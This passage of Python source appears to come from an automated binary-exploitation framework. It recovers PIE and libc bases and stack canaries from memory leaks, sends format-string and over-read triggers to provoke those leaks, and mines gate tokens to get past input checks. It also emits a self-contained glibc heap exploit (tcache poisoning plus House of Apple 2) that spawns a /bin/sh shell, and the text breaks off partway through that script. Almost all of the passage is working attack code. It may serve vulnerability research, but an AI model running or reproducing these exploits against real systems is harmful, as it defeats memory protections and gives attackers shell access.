    return _PTR_HI_MIN <= b <= _PTR_HI_MAX


def _le_pointer_words(data: bytes, cap: int = 256) -> list:
    """Little-endian 8-byte words in `data` that look like an x86-64 userspace pointer: the top two
    bytes zero and the next byte in the high-half range [0x10, 0x7f] (libc/mmap/stack/PIE/heap --
    see `_PTR_HI_MIN`). A raw stack over-read (CWE-125) echoes memory as BINARY, not hex, so the
    saved return into __libc_start_main, environ/stack and PIE code pointers sit there as raw words
    -- harvesting them gives classify_leak the multiple corroborating pointers it needs to pin a
    base from an un-labelled leak. All byte offsets are scanned (a text prefix can push pointers off
    8-byte alignment); spurious hits are filtered downstream by cross-pointer corroboration."""
    out = []
    for i in range(0, max(0, len(data) - 7)):
        if data[i + 6] == 0 and data[i + 7] == 0 and _is_ptr_hi(data[i + 5]):
            out.append(int.from_bytes(data[i:i + 8], "little"))
            if len(out) >= cap:
                break
    return out


def _case_fold_pointer_candidates(data: bytes, *, cap: int = 4096) -> list:
    """Candidate pointer VALUES recovered from a leak the viewer CASE-FOLDED on output (a `funkify`
    / toupper / tolower echo). A byte in [A-Za-z] loses its case, so a leaked pointer's letter bytes
    are ambiguous -- and crucially the image top byte 0x55 ('U') / 0x56 ('V') can arrive LOWERCASED
    as 0x75 ('u') / 0x76 ('v'), which `_le_pointer_words` (looking for 0x55/0x56/0x7f) would miss.

    For every 6-byte little-endian run whose top byte is 0x55/0x56/0x7f OR the case-folded 0x75/0x76,
    un-fold the top byte and enumerate the case variants of the lower-5 alpha bytes (the ambiguity),
    yielding each candidate address. A real pointer's page offset still matches a unique image anchor,
    so recover_pie_base(allow_single) / classify_leak pick the true one; the bogus case-variants fail
    corroboration. Bounded (<= 2**5 variants per run) so the brute stays tiny. Transform-agnostic: it
    does not need to know the exact fold rule, only that case was lost."""
    import itertools
    tops = {0x7F: 0x7F, 0x55: 0x55, 0x56: 0x56, 0x75: 0x55, 0x76: 0x56}
    out, seen = [], set()
    for i in range(0, max(0, len(data) - 5)):
        top = tops.get(data[i + 5])
        if top is None:
            continue
        low = data[i:i + 5]
        # per-byte case variants of the low 5 bytes (letters -> {upper, lower}); non-letters fixed
        choices = []
        for b in low:
            if 0x41 <= b <= 0x5A:
                choices.append((b, b + 0x20))
            elif 0x61 <= b <= 0x7A:
                choices.append((b, b - 0x20))
            else:
                choices.append((b,))
        nvar = 1
        for c in choices:
            nvar *= len(c)
        if nvar > 64:                                    # too ambiguous -> keep only the raw reading
            choices = [(c[0],) for c in choices]
        for combo in itertools.product(*choices):
            v = int.from_bytes(bytes(combo) + bytes([top]), "little")
            if v not in seen:
                seen.add(v)
                out.append(v)
            if len(out) >= cap:
                return out
    return out


# --- automatic leak classification + provocation (gap #2) ---------------------------------------
def _le_canary_words(data: bytes, cap: int = 64) -> list:
    """8-byte words in `data` shaped like a glibc stack canary -- low byte 0x00, the rest non-zero,
    and NOT a canonical pointer. A raw stack over-read leaks the canary as exactly such a word, which
    _le_pointer_words (pointer-shaped only) drops, so find_canary never saw it. Scanned at every byte
    offset (a text prefix shifts 8-byte alignment); a wrong candidate only makes the canary-writeback
    trip __stack_chk_fail, which fails the exploit safely rather than confirming a false L3."""
    out = []
    for i in range(0, max(0, len(data) - 7)):
        wb = data[i:i + 8]
        if wb[0] != 0 or wb[1] == 0:                      # NUL terminator low, byte 1 random-nonzero
            continue
        if sum(1 for b in wb if b) < 5:                   # a real canary is high-entropy (7 nonzero
            continue                                      # bytes); a shifted window has few -> reject
        w = int.from_bytes(wb, "little")
        if (0x550000000000 <= w <= 0x5FFFFFFFFFFF) or (0x7F0000000000 <= w <= 0x7FFFFFFFFFFF):
            continue                                      # a pointer that happens to end in 0x00
        out.append(w)
        if len(out) >= cap:
            break
    return out


_SEQ_DUMP_RE = re.compile(rb"0x[0-9a-fA-F]+|\(nil\)")


def canary_slot_in_dump(dump: bytes, canary: int, trigger: bytes = b"") -> int | None:
    """The 1-based positional `%N$` slot the stack canary printed at, from a SEQUENTIAL `%p` dump.

    A sequential `%p.%p.%p...` sink prints vararg 1, 2, 3, ... in order, so the canary's index among
    the printed words is its slot. Recovering it lets the caller swap the long sequential trigger for
    a SHORT targeted `%N$p` -- which fits a small bounded read() with no bytes left in the pipe to
    shift the follow-up overflow (the edge where a sequential trigger longer than the leak read
    broke discover_canary_offset and the skew sweep). Only valid for a sequential dump; None
    otherwise (a positional dump or an over-read has no 1:1 index->slot mapping)."""
    t = (trigger or b"").lstrip()
    if not (t.startswith(b"%p") and b"$" not in t[:8]):     # not a plain sequential dump
        return None
    words = _SEQ_DUMP_RE.findall(dump or b"")
    for i, w in enumerate(words):
        if w == b"(nil)":
            continue
        try:
            if int(w, 16) == (canary & 0xFFFFFFFFFFFFFFFF):
                return i + 1                                 # value[i] printed by %<i+1>$
        except ValueError:
            continue
    return None


def classify_leak(vals, target_bytes: bytes, libc_data: bytes = b"") -> dict:
    """Auto-classify a leaked-pointer burst: recover the PIE base (from the binary's own symbols),
    the libc base (from libc's symbols, when a libc is given) and the stack canary, using ONLY the
    leak. Returns {pie_base, libc_base, canary} with None for whatever could not be corroborated.
    This removes the analyst's slot-picking WHEN the dump is rich enough (>=2 corroborating pointers
    for a base; a null-low-byte word for the canary); a sparse dump still yields None and falls back
    to an analyst-supplied slot."""
    from . import rop
    from .exploit import recover_pie_base
    return {
        "pie_base": recover_pie_base(vals, target_bytes),
        "libc_base": rop.recover_libc_base(vals, libc_data) if libc_data else None,
        "canary": rop.find_canary(vals),
    }


def _ptr_shaped(v: int) -> bool:
    """Does this value have the SHAPE of an x86-64 userspace pointer: top two bytes zero and the
    next byte 0x7f (libc/mmap/stack) or 0x55/0x56 (a PIE image mapping)?

    `_le_pointer_words` applies this test by construction -- it is how a raw over-read is scanned
    at all -- and the hex-text harvest had no equivalent, which is worse than it sounds: a `%p`
    dump prints stack residue, and residue includes ASCII words (`0x4f2d544552434553` is
    "SECRET-O"). Each one is a 64-bit candidate with a 1-in-4096 chance of matching any single
    curated anchor's page offset, and a dump offers a dozen of them against ten anchors. Measured
    immediately: a 32-directive dump of the format-string fixture "proved" libc base
    0x1f7f6b000 -- not a libc base at all, from a word that was never a pointer.

    A non-PIE image pointer (0x4xxxxx) is excluded along with them, and that is right rather than
    unfortunate: a non-PIE image has no load base to disclose, so "ASLR defeated by this leak" is
    a claim about nothing."""
    return (v >> 48) == 0 and ((v >> 40) & 0xFF) in (0x7F, 0x55, 0x56)


def disclosed_bases(output: bytes, target_bytes: bytes, libc_data: bytes = b"", *,
                    baseline: bytes = b"") -> dict:
    """What an out-of-bounds READ proves about ASLR, from the program's OWN output.

    This is the rung an OOB read was missing. `oob_access_primitive` already shows the access is
    out of bounds and that the attacker chooses HOW FAR -- an L2 disclosure primitive. What it
    could not say is whether the disclosed bytes are worth anything, and the answer decides
    everything downstream: adjacent heap memory full of pointers defeats ASLR, and adjacent
    memory full of pixel data does not.

    TWO facts about the physics, both of which shape this:

    1. **The build that FINDS the bug cannot DEMONSTRATE the leak.** On an ASan build the process
       aborts inside the read, so nothing reaches stdout or the output file. The disclosure is
       observable only where the read SUCCEEDS -- the uninstrumented build. So the caller detonates
       twice, on purpose, and these are the bytes from the second run.

    2. **No output differencing is needed, and that matters.** The uninitialised-memory class was
       measured to be undecidable that way (see the uninit oracle: libc-laundered vs intercepted),
       because one run's garbage looks like another's. A POINTER is different: its low 12 bits are
       page-invariant under ASLR, so a leaked image pointer's `& 0xfff` equals the page offset of
       whatever symbol it points at, and `recover_pie_base` / `rop.recover_libc_base` accept a base
       only when two DISTINCT slots corroborate it. A value that resolves to this binary's own
       symbol layout is not a coincidence, so the leak validates ITSELF against the target --
       `baseline` is used only to report how many bytes were EXTRA, never as the oracle.

    Both renderings are harvested: raw little-endian words (a binary over-read echoes memory
    verbatim) and hex text (a program that prints what it read through `%p`/`%x`).

    Returns {pointers, pie_base, libc_base, canary, proved, disclosed_bytes, note}. `proved` is
    True only when a base was corroborated -- which is the whole claim.
    """
    from . import rop
    from .exploit import recover_pie_base
    # RAW WORDS FIRST, case-fold variants only if they find nothing. The variants exist for a
    # leak the viewer put through toupper/tolower, where the real pointer is unreadable without
    # them -- but each one is a near-miss of a real pointer with the SAME low 12 bits, so it
    # proposes a different base that is just as well anchored. Mixing them in unconditionally
    # therefore broke the uniqueness the single-slot rule depends on: measured on a binary heap
    # over-read, the raw words recovered the true PIE base 8/8 and adding the variants recovered
    # it 3/8, with 1-3 phantom bases per run. The docstring of `_case_fold_pointer_candidates`
    # asserts the bogus variants "fail corroboration", and against the two-slot rule they do;
    # against the single-slot rule they do the opposite, which is what went unnoticed.
    raw = list(_le_pointer_words(output, cap=4096))
    # ...and the HEX TEXT rendering, which this claimed to harvest and did not. A binary over-read
    # echoes memory as raw words; a program that PRINTS what it read -- `%p`, a format-string leak,
    # a debug dump -- emits `0x55...`/`0x7f...` as characters, and not one of those bytes passes the
    # raw-word test. Measured on the format-string read fixture: 30 `%p` disclosed a PIE code
    # pointer, two libc pointers and the stack, and this function reported `distinct: 0`. A printed
    # pointer is a primary rendering and as trustworthy as a raw one (it is an explicit pointer
    # print, not a coincidence of bytes), so it joins the STRICT pool rather than the fallback one.
    raw += [v for v in (int(m.group(1), 16)
                        for m in re.finditer(rb"0[xX]([0-9a-fA-F]{6,16})\b", output))
            if _ptr_shaped(v)]
    folded = [v for v in _case_fold_pointer_candidates(output) if v not in raw]
    vals = raw + folded
    # STRICT first: two distinct slots corroborating one base. Then the unambiguous-single rule,
    # because a heap over-read is not a stack over-read. A stack dump hands over a dozen
    # different slots; a heap neighbour commonly holds ONE distinctive pointer repeated at a
    # fixed stride -- 32 copies of `stdout`, or of `&main`, are one slot and not thirty two. The
    # two-slot rule therefore rejects leaks that are in fact unambiguous, and uniqueness of the
    # page-offset match across the image (or the curated libc anchors) is what makes accepting
    # them safe rather than optimistic. Measured on a PIE fixture over 5 runs under real ASLR:
    # the single-slot rule recovered the TRUE load base 5/5 times.
    rule = None
    pie = libc = None
    for pool, folded_in in ((raw, False), (vals, True)):
        if folded_in and not folded:
            break                                    # nothing to add; the first pass was final
        if not pool:
            continue
        if pie is None:
            pie = recover_pie_base(pool, target_bytes)
            if pie:
                rule = rule or ("corroborated" if not folded_in else "corroborated-case-folded")
        if libc is None and libc_data:
            libc = rop.recover_libc_base(pool, libc_data)
            if libc:
                rule = rule or ("corroborated" if not folded_in else "corroborated-case-folded")
        if pie is None:
            pie = recover_pie_base(pool, target_bytes, allow_single=True)
            if pie:
                rule = rule or ("unambiguous-single" if not folded_in
                                else "unambiguous-single-case-folded")
        if libc is None and libc_data:
            libc = rop.recover_libc_base(pool, libc_data, allow_single=True)
            if libc:
                rule = rule or ("unambiguous-single" if not folded_in
                                else "unambiguous-single-case-folded")
        if pie and libc:
            break
    canary = rop.find_canary(vals) if vals else None
    extra = max(0, len(output) - len(baseline)) if baseline else None
    proved = bool(pie or libc)
    if proved:
        what = ", ".join(x for x in (
            f"PIE base {pie:#x}" if pie else "",
            f"libc base {libc:#x}" if libc else "",
            f"stack canary {canary:#x}" if canary else "") if x)
        how = ("two independent leaked slots corroborate it"
               if (rule or "").startswith("corroborated")
               else "one leaked slot whose page offset matches exactly one symbol, so it is "
                    "unambiguous")
        if (rule or "").endswith("-case-folded"):
            how += (", recovered after un-folding a case-transformed echo (the raw bytes alone "
                    "resolved nothing)")
        note = (f"the out-of-bounds read disclosed live pointers into the program's own output: "
                f"{what} -- {how}. ASLR is defeated from the leak alone")
    elif vals:
        note = (f"{len(vals)} pointer-shaped word(s) reached the output but none corroborated a "
                f"base (a single match is coincidence at this anchor count), so the disclosure "
                f"is real and its contents are not yet usable")
    else:
        note = ("the read is out of bounds but what it disclosed carries no pointer, so it "
                "discloses data rather than defeating ASLR")
    return {"pointers": vals[:32], "distinct": len(set(vals)), "pie_base": pie,
            "libc_base": libc, "canary": canary, "proved": proved, "rule": rule,
            "disclosed_bytes": extra, "note": note}


def _gate_preambles(target_bytes=b"", strings=(), known_inputs=(), cap=6) -> list:
    """Candidate byte strings that pass a program's INPUT GATE, so a leak trigger sent AFTER them
    actually reaches the leaking sink.

    A leak behind a gate -- `strstr(input, "TOKEN")`, a required banner reply, a password/menu
    prompt -- is never reached when the trigger is the first thing written: the program rejects it
    and exits before the leaking printf / over-read, so the provocation silently fails on exactly
    the interactive targets that most need it (e.g. a `strstr(input,"TOKEN")`
    gate guards the `printf("...%s", input)` that discloses the stack). Mined from (1) known
    gate-passing inputs the pipeline already found -- the leading printable run of a concolic/fuzz
    crash input that reached the bug -- and (2) the binary's own selective strings, since a gate
    token is almost always a literal in the image. Deduped and bounded; each is tried as the start
    of a leak trigger (a single write, for a gate that reads the whole line) by the caller."""
    import re as _re
    out: list = []
    seen: set = set()

    def _add(b: bytes):
        b = bytes(b).rstrip(b"\x00")
        if b and b not in seen and 2 <= len(b) <= 64:
            seen.add(b)
            out.append(b)

    for ki in known_inputs or ():                        # leading printable run of a solved input
        run = bytearray()
        for ch in bytes(ki):
            if 0x20 <= ch < 0x7f:
                run.append(ch)
            else:
                break
        if len(run) >= 2:
            _add(bytes(run))
    svals = list(strings or ())
    if not svals and target_bytes:                       # fall back to the image's own strings
        svals = [m.group(0).decode("latin-1") for m in _re.finditer(rb"[ -~]{3,48}", target_bytes)]
    for s in svals:
        s = (s if isinstance(s, str) else s.decode("latin-1", "ignore")).strip()
        # a plausible gate token: wordy, not a format/path/flag fragment
        if 3 <= len(s) <= 48 and any(c.isalpha() for c in s) \
                and not s.startswith(("%", "/", "-", ".")) and "%" not in s:
            _add(s.encode("latin-1", "ignore"))
        if len(out) >= cap:
            break
    return out[:cap]


def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), timeout=6.0,
                      mem_mb=2048, read_cap=64, strings=(), known_inputs=(),
                      drive_prompts=False, deadline=None, extra_triggers=()) -> dict:
    """Best-effort automatic leak: drive the target with a format-string `%p` dump (sequential that
    fits `read_cap`, then positional to reach deeper slots) and classify what comes back. Returns
    the classification plus the winning trigger, or empties when nothing was disclosed (the target
    has no format-string sink, or none reachable). Pure provocation -- a target with no printf(user)
    just echoes the specifier as text and classify_leak finds nothing.

    `extra_triggers` are inputs a previous stage PROVED disclose memory, and they are tried first.
    The sweep below is speculative by construction -- `%p` dumps and runs of `A` -- so it finds a
    leak only where an unstructured write reaches the sink. An out-of-bounds READ confirmed at L2
    is the opposite: a specific, often structured input (a length field, a `key=`, an index past
    the end) measured against the live target, which this list would never synthesise. Seeding it
    here rather than handing this stage a RECOVERED BASE is deliberate: a base from an earlier
    process is stale the moment that process exits, so the caller gets the recipe and re-recovers
    the base live, which is what makes the recon cacheable at all.

    Delivery is over stdin for every trigger, seeded or not, which is this function's contract and
    its limit: an out-of-bounds read reached through a FILE argument is recorded by L2 and cannot
    be replayed here. That is the remaining gap in this handoff, not a silent failure -- the
    caller filters by the channel L2 measured."""
    import re as _re
    hexrx = _re.compile(rb"0x[0-9a-fA-F]+")
    exedir = str(Path(exe).resolve().parent)
    # Sequential dump sized to the read, then a few positional probes for deep code/libc pointers.
    seq = b"%p" + b".%p" * max(1, (read_cap - 4) // 3)
    # `b""` FIRST: classify the target's OWN output with no provocation. Many real programs disclose a
    # pointer through normal flow -- a diagnostic that prints `&main`/an object address, an error that
    # echoes a heap/libc pointer, a status line. That is a usable ASLR-defeating leak with no
    # format-string sink at all, and the old harness threw the pre-trigger banner away and only ever
    # classified a %p dump. The format-string provocations follow for a printf(user) sink.
    triggers = [b""]
    # PROVEN first. A seeded trigger has already been observed to disclose memory on this very
    # target, so paying for the speculative list before it wastes the deadline the sweep is
    # bounded by -- and on a target with no format sink that list costs its full timeout each.
    triggers += [t for t in extra_triggers if isinstance(t, bytes) and t]
    triggers += [seq[:read_cap] + b"\n"]
    triggers += [(b"|".join(b"%%%d$p" % i for i in range(a, a + 12)) + b"\n")[:read_cap] + b"\n"
                 for a in (7, 19, 31)]
    # Over-read / uninitialized-print provocation (CWE-125): FILL the input buffer with non-NUL bytes
    # so a following over-long or unbounded output primitive -- write(fd,buf,BIG), puts, fwrite,
    # printf("%s",buf) -- echoes the stack PAST the buffer (saved rbp, canary, a return into PIE code,
    # libc pointers) as RAW little-endian words that `_le_pointer_words` harvests. This is the common
    # leak with no printf(user) sink at all. Sent WITHOUT a trailing newline so a raw read(fd,buf,N)
    # returns the moment the buffer is full; several sizes cover the unknown buffer length.
    triggers += [b"A" * n for n in (64, 128, 256)]
    # Gate-aware variants: prefix the over-read fills and the %p dump with each candidate gate
    # token, so the SAME input both passes an input gate (strstr(input,"TOKEN"), a banner reply)
    # and provokes the leak -- the sink behind the gate is otherwise never reached. The leaking
    # sink usually operates on this very input (printf("...%s", input)), so a single write suffices.
    for g in _gate_preambles(target_bytes, strings=strings, known_inputs=known_inputs):
        triggers += [g + b"A" * n for n in (64, 128, 256)]
        triggers.append((g + seq)[:read_cap] + b"\n")
    best = {"pie_base": None, "libc_base": None, "canary": None, "trigger": None, "dump": b""}
    # BOUNDED IN TIME. Every trigger spawns the target and waits on select for its timeout, and a
    # target with no format sink pays that in full for each one -- so the cost is "number of
    # triggers x timeout" and nothing related to the slice the caller was given. Profiled on
    # `/usr/bin/xxd`: 33 spawns, 63 reads, 1,084 select calls, 109.4 s of a 109.8 s stage against
    # a 25.5 s budget; the stage then overran its kill deadline, the heartbeat stopped, and the
    # run was filed `lease expired` even though it had reached the right answer. A deadline stops
    # the sweep where it is: a leak found in the first few triggers is found either way, and a
    # target that has no leak costs what the caller can afford instead of what the list costs.
    for trig in triggers:
        if deadline is not None and time.time() >= deadline:
            break
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + \
            [str(exe)] + [str(a) for a in base_argv]
        try:
            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                 preexec_fn=preexec)
        except Exception:                                    # noqa: BLE001
            continue
        try:
            # The pre-trigger banner is the target's OWN output -- keep it (a natural leak lives
            # here), don't discard it. For the empty trigger we classify the banner alone; otherwise
            # we fold it into the provoked dump so a natural pointer is seen even alongside a %p sink.
            banner = _read_until(p, time.time() + (timeout / 2 if not trig else 0.4))
            if trig:
                try:
                    p.stdin.write(trig)
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                dump = banner + _read_until(p, time.time() + timeout / 2)
            else:
                dump = banner
        finally:
            for s in (p.stdin, p.stdout):
                try:
                    if s is not None:
                        s.close()
                except Exception:                            # noqa: BLE001
                    pass
            _kill(p)
            try:
                p.wait(timeout=2)
            except Exception:                                # noqa: BLE001
                pass
        # Harvest pointers two ways. (1) HEX TEXT: a %p dump or a diagnostic that prints an address.
        # (2) RAW LITTLE-ENDIAN WORDS: a stack over-read (the common CWE-125) echoes binary memory,
        # not hex -- the saved return into __libc_start_main, environ/stack pointers, PIE code
        # pointers all sit there as raw 8-byte words. Scanning them gives classify_leak the MULTIPLE
        # corroborating pointers it needs to pin a base from an un-labelled leak. A plausible x86-64
        # userspace pointer is 0x0000_7fxx_xxxx_xxxx (libc/mmap/stack) or 0x0000_55/56xx (PIE image).
        vals = [int(m.group(0), 16) for m in hexrx.finditer(dump) if _allint(m.group(0))]
        vals += _le_pointer_words(dump)
        vals += _le_canary_words(dump)                   # canary isn't pointer-shaped -> harvest it
        cls = classify_leak(vals, target_bytes, libc_data)
        # keep the richest result (most fields recovered), but on a TIE prefer the one that
        # recovered the CANARY. The canary is the gating secret for a canary-protected target and
        # the hard thing to leak; a base-only leak of equal field-count cannot exploit a canary
        # target at all (ret2libc past a canary needs the canary too, and a non-PIE ret2win needs
        # only it). Without this tiebreak an L2 disclosure `extra_trigger` that leaks a base first
        # (score 1) pinned `best`, and the later %p dump that leaks the canary (also score 1) could
        # never replace it -- so `_canary_auto_ret2libc` saw canary=None and declined. (A canary and
        # a base from DIFFERENT triggers are different processes and cannot be combined, so this is a
        # genuine choice between recipes, not a merge.)
        score = sum(cls[k] is not None for k in ("pie_base", "libc_base", "canary"))
        best_score = sum(best[k] is not None for k in ("pie_base", "libc_base", "canary"))
        if score > best_score or (score == best_score and score > 0
                                  and cls["canary"] and not best["canary"]):
            best = {**cls, "trigger": trig, "dump": dump[:400]}
        if cls["canary"] and (cls["libc_base"] or cls["pie_base"]):   # both in ONE process -> done
            best = {**cls, "trigger": trig, "dump": dump[:400]}
            break
    # Fallback for a leak behind a TYPED prompt sequence: the single-write triggers above fail when
    # the program reads several typed inputs (a number, a name) before the leaking sink -- a generic
    # fill fails a scanf("%d") and the program aborts before the leak. Drive the prompts, answering
    # each by its classified type, and inject the over-read at one input. Lazy import avoids the
    # interaction<->leak cycle. OPT-IN (drive_prompts) and gated to a MULTI-READ target, because the
    # prompt sweep spawns many processes -- the normal single-read exploit ladder must not pay it;
    # only a hardened, prompt-gated path (the canary/PIE leak path) asks for it.
    if (drive_prompts and not (best.get("canary") or best.get("pie_base") or best.get("libc_base"))):
        try:
            from .. import interaction
            if len(interaction.read_sizes(target_bytes)) < 2:
                return best                                  # single-read: first-write path suffices
            d = interaction.drive_to_leak(exe, workdir, target_bytes, libc_data,
                                          base_argv=base_argv, timeout=timeout)
            if d.get("canary") or d.get("pie_base") or d.get("libc_base"):
                best = {"pie_base": d.get("pie_base"), "libc_base": d.get("libc_base"),
                        "canary": d.get("canary"), "trigger": b"", "recipe": d.get("recipe"),
                        "dump": b"", "inject_at": d.get("inject_at")}
        except Exception:                                    # noqa: BLE001 -- fallback is best-effort
            pass
    return best


def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, system_off,
                       poison_size=0x300, guard_size=0x430, width=None,
                       strategy="large-chunk", fill_size=0x100, fill_max=20,
                       fill_slots=None) -> bytes:
    """A self-contained, stdlib-based reproducer for the automated glibc-heap -> shell chain
    (unsorted-bin libc leak -> tcache-fd heap leak -> tcache poison of _IO_2_1_stdout_ -> House of
    Apple 2 -> system("/bin/sh")). ASLR-dependent, so no static input can exist -- the libc base and
    heap page are recovered live; only the libc OFFSETS (measured at build time) are embedded. The
    menu is driven with the same op templates, field width and leak extraction the exploit used, so
    the shipped reproducer replays exactly what was confirmed (line-based OR fixed-width fields, and
    a view that prints a prompt before the raw chunk bytes)."""
    ops = {k: (v if isinstance(v, str) else v.decode("latin-1")) for k, v in menu_ops.items()}
    return (
        "#!/usr/bin/env python3\n"
        "# Lykos L3 reproducer: glibc heap -> shell (tcache poison + House of Apple 2). Authorized-use only.\n"
        "import os, select, struct, subprocess, sys, time\n"
        "EXE = sys.argv[1] if len(sys.argv) > 1 else './target.bin'\n"
        f"OPS={ops!r}\n"
        f"WIDTH={int(width) if width else None!r}   # fixed-width read(fd,buf,W) fields, or None (lines)\n"
        f"UNSORTED_OFF={unsorted_off:#x}; STDOUT_OFF={stdout_off:#x}; "
        f"WFILE_JUMPS_OFF={wfile_jumps_off:#x}; SYSTEM_OFF={system_off:#x}\n"
        f"POISON={poison_size:#x}; GUARD={guard_size:#x}\n"
        f"STRATEGY={strategy!r}; FILL={fill_size:#x}; FILLSLOTS={int(fill_slots or fill_max)}\n"
        f"SPLIT={poison_size < 0x2A8!r}   # the one-piece fake FILE needs 0x2A8 bytes\n"
        "SIZES={}\n"
        "def render(t, idx=None, size=None, data=b'', dsize=None):\n"
        "    def sub(s):\n"
        "        if idx is not None: s=s.replace('{idx}',str(idx))\n"
        "        if size is not None: s=s.replace('{size}',str(size))\n"
        "        return s\n"
        "    if WIDTH:   # each scalar padded to WIDTH bytes, the data buffer NUL-padded to its chunk size\n"
        "        out=b''\n"
        "        for f in t.split('\\n'):\n"
        "            if not f: continue\n"
        "            if f=='{data}': out+=bytes(data).ljust(dsize,b'\\x00')[:dsize] if dsize else bytes(data)\n"
        "            else: out+=(sub(f).encode()+b' '*WIDTH)[:WIDTH]\n"
        "        return out\n"
        "    head, sep, tail = t.partition('{data}')\n"
        "    out=sub(head).encode()\n"
        "    if sep: out+=bytes(data)+sub(tail).encode()\n"
        "    return out\n"
        "def ADD(i,s,d): SIZES[i]=s; return render(OPS['add'],i,s,d,dsize=s)\n"
        "def FREE(i): return render(OPS['free'],i)\n"
        "def VIEW(i): return render(OPS['view'],i)\n"
        "def EDIT(i,d):   # an edit that re-asks the length declares it; else it reads up to the chunk\n"
        "    if '{size}' in OPS['edit']: return render(OPS['edit'],i,len(d),d,dsize=len(d))\n"
        "    return render(OPS['edit'],i,data=d,dsize=SIZES.get(i))\n"
        "EXIT=render(OPS['exit_seq'])\n"
        "def read_until(p, deadline, quiet=0.2):\n"
        "    out=b''; last=time.time()\n"
        "    while time.time()<deadline:\n"
        "        r,_,_=select.select([p.stdout],[],[],0.1)\n"
        "        if r:\n"
        "            c=os.read(p.stdout.fileno(),4096)\n"
        "            if not c: break\n"
        "            out+=c; last=time.time()\n"
        "        elif p.poll() is not None: break\n"
        "        elif out and (time.time()-last)>quiet: break\n"
        "    return out\n"
        "def hoa2_split(stdout_addr, wide_addr, wfile_jumps, system, command=b' /bin/sh'):\n"
        "    # the fake _IO_wide_data (+0) and its jump table (+0x18) live in OUR chunk, so the write\n"
        "    # at stdout is only the 0xE0-byte FILE: no single write needs 0x2A8 bytes\n"
        "    wide=bytearray(b'\\x00'*0xE8); hdr=bytearray(b'\\x00'*0xE0)\n"
        "    def w(b,o,v): b[o:o+8]=struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
        "    w(wide,0x30,0); w(wide,0x18+0x68,system); w(wide,0xE0,wide_addr+0x18)\n"
        "    hdr[0:len(command)]=command\n"
        "    w(hdr,0x20,0); w(hdr,0x28,1); w(hdr,0x38,0)\n"
        "    w(hdr,0x88,wide_addr+0xA0); w(hdr,0xA0,wide_addr); w(hdr,0xD8,wfile_jumps)\n"
        "    return bytes(hdr), bytes(wide)\n"
        "def hoa2(write_addr, wfile_jumps, system, command=b' /bin/sh'):\n"
        "    b=bytearray(b'\\x00'*0x300)\n"
        "    def w(o,v): b[o:o+8]=struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
        "    b[0:len(command)]=command\n"
        "    w(0x28,1); w(0x88,write_addr+0x2a0); w(0xa0,write_addr+0xe0); w(0xd8,wfile_jumps)\n"
        "    w(0xe0+0x30,0); w(0xe0+0xe0,write_addr+0x200); w(0x200+0x68,system)\n"
        "    return bytes(b)\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "def op(seq,secs=0.35):\n"
        "    p.stdin.write(seq); p.stdin.flush(); return read_until(p, time.time()+secs)\n"
        "def windows(o):   # 8-byte pointer candidates; pure-ASCII windows are prompt text\n"
        "    for i in range(max(0,len(o)-7)):\n"
        "        w=o[i:i+8]\n"
        "        if all(b==0 or 0x20<=b<=0x7e for b in w): continue\n"
        "        yield i, struct.unpack('<Q',w)[0]\n"
        "def binhead(v):   # a freed chunk links into the unsorted bin head OR, once sorted, its\n"
        "    if not (0x7F0000000000<=v<0x800000000000): return None   # size's small-bin head; the\n"
        "    for k in range(128):                                    # bins sit at 0x10 strides and\n"
        "        b=v-(UNSORTED_OFF+0x10*k)                           # page alignment admits only one\n"
        "        if b>0 and b%0x1000==0: return b\n"
        "    return None\n"
        "read_until(p, time.time()+0.5)\n"
        "base=None; off=0; PB=2\n"
        "if STRATEGY=='tcache-fill':   # size-capped notebook: fill the bin until a chunk spills out\n"
        "    PB=0\n"
        "    n=FILLSLOTS   # measured when this exploit was built; never probe past the table (a\n"
        "    assert n>=3, 'slot table too small (%d)'%n   # refused add desyncs the menu and exits)\n"
        "    for i in range(n): op(ADD(i,FILL,b'A'))\n"
        "    for i in list(range(1,n))+[0]:   # lowest LAST: the spilling chunk must not border the\n"
        "        op(FREE(i)); vo=op(VIEW(i),0.45)   # top chunk, or it consolidates instead of linking\n"
        "        for o,v in windows(vo):\n"
        "            b=binhead(v)\n"
        "            if b: base,off=b,o; break\n"
        "        if base: break\n"
        "elif STRATEGY=='tcache-dup':   # few slots: re-enter ONE chunk, clearing the tcache key\n"
        "    PB=0\n"
        "    op(ADD(0,FILL,b'A')); op(ADD(1,FILL,b'G'))   # victim + a guard off the top chunk\n"
        "    for _ in range(24):\n"
        "        op(FREE(0)); vo=op(VIEW(0),0.45)\n"
        "        for o,v in windows(vo):\n"
        "            b=binhead(v)\n"
        "            if b: base,off=b,o; break\n"
        "        if base: break\n"
        "        op(EDIT(0,b'\\x00'*16))   # clear fd+key so the next free re-enters the bin\n"
        "else:                         # one above-tcache chunk links into a bin head immediately\n"
        "    op(ADD(0,GUARD,b'A')); op(ADD(1,GUARD,b'B')); op(FREE(0))\n"
        "    vo=op(VIEW(0),0.5)\n"
        "    for o,v in windows(vo):\n"
        "        b=binhead(v)\n"
        "        if b: base,off=b,o; break\n"
        "assert base, 'libc leak failed'\n"
        "stdout_addr=base+STDOUT_OFF\n"
        "def page_of(o):   # chunk>>12 from a LONE tcache entry, at the calibrated offset\n"
        "    if len(o)>=off+8:\n"
        "        c=struct.unpack('<Q',o[off:off+8])[0]\n"
        "        if 0<c<(1<<40): return c\n"
        "    return next((v for _,v in windows(o) if 0<v<(1<<40)),0)\n"
        "payload=None\n"
        "if SPLIT:   # the size cap cannot hold the one-piece FILE: park the fake _IO_wide_data and\n"
        "    op(ADD(PB,POISON,b'C')); op(ADD(PB+1,POISON,b'D'))   # its jump table in our OWN chunk\n"
        "    op(FREE(PB)); heap=page_of(op(VIEW(PB),0.5))\n"
        "    assert heap, 'heap page failed'\n"
        "    op(FREE(PB+1)); fo=op(VIEW(PB+1),0.5)\n"
